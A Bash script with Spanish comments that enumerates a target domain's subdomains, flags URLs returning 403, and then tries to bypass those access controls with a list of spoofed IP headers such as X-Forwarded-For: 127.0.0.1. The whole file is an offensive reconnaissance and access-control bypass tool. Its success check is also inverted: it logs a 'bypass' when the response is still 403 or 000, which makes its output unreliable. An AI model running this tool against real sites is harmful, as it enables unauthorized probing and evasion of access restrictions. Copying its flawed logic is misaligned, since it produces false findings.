#!/bin/bash

# Colores
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
NC="\033[0m"

# Verificar argumento
if [ -z "$1" ]; then
    echo -e "${GREEN}[+] Uso: ${NC} $0 dominio.com"
    exit 1
fi

DOMINIO=$1
OUTPUT_DIR="enum_$DOMINIO"
mkdir -p "$OUTPUT_DIR"

# Wordlist para fuzzing activo
WORDLIST="/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt"

echo -e "${GREEN}[+] Buscando subdominios con subfinder ... ${NC}"
subfinder -d "$DOMINIO" -silent > "$OUTPUT_DIR/subs_subfinder.txt"

echo -e "${GREEN}[+] Buscando subdominios con assetfinder ... ${NC}"
assetfinder --subs-only "$DOMINIO" | grep -i "\.$DOMINIO" > "$OUTPUT_DIR/subs_assetfinder.txt"

echo -e "${GREEN}[+] Haciendo fuzzing activo con dnsx ... ${NC}"
cat "$WORDLIST" | sed "s/^/$DOMINIO./" > "$OUTPUT_DIR/fuzz_dnsx_lista.txt"
dnsx -l "$OUTPUT_DIR/fuzz_dnsx_lista.txt" -silent > "$OUTPUT_DIR/subs_dnsx.txt"

echo -e "${GREEN}[+] Unificando y limpiando resultados ... ${NC}"
cat "$OUTPUT_DIR/subs_subfinder.txt" "$OUTPUT_DIR/subs_assetfinder.txt" "$OUTPUT_DIR/subs_dnsx.txt" | sort -u > "$OUTPUT_DIR/todos_limpios.txt"

echo -e "${GREEN}[+] Ejecutando HTTPX para ver status codes ... ${NC}"
/usr/local/bin/httpx -l "$OUTPUT_DIR/todos_limpios.txt" -sc -title -silent > "$OUTPUT_DIR/httpx_output.txt"

echo -e "${GREEN}[+] Detectando URLs con status 403 ... ${NC}"
awk '{ if ($2~/^\[403\]/) print $1 }' "$OUTPUT_DIR/httpx_output.txt" > "$OUTPUT_DIR/urls_403.txt"

# Payloads para intentar bypass del 403
HEADERS=(
    "Client-IP: 127.0.0.1"
    "Forwarded-For-Ip: 127.0.0.1"
    "Forwarded-For: 127.0.0.1"
    "Forwarded-For: localhost"
    "True-Client-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: localhost"
    "X-Forwarded-Server: 127.0.0.1"
    "X-Forwarded-Server: localhost"
    "X-Host: 127.0.0.1"
    "X-Host: localhost"
    "X-HTTP-Host-Override: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-Remote-Addr: localhost"
    "X-Remote-IP: 127.0.0.1"
)

echo -e "${GREEN}[+] Intentando bypass de 403 con headers ... ${NC}"
while read -r URL; do
    for HEADER in "${HEADERS[@]}"; do
        NAME=$(echo "$HEADER" | cut -d':' -f1)
        VALUE=$(echo "$HEADER" | cut -d':' -f2- | sed 's/^ *//')
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "$NAME: $VALUE" "$URL")
        if [[ "$STATUS" == "403" || "$STATUS" == "000" ]]; then
            echo -e "${YELLOW}[V] Bypass exitoso en:${NC} $URL ${GREEN}con header${NC} $HEADER -> ${YELLOW} $STATUS${NC}"
            echo "$URL - $HEADER -> $STATUS" >> "$OUTPUT_DIR/bypass_403_success.txt"
            break
        fi
    done
done < "$OUTPUT_DIR/urls_403.txt"

echo -e "${GREEN}[V] Todo listo. Resultado final en:${NC} $OUTPUT_DIR/httpx_output.txt"
echo -e "${GREEN}[V] Bypass exitosos guardados en:${NC} $OUTPUT_DIR/bypass_403_success.txt"
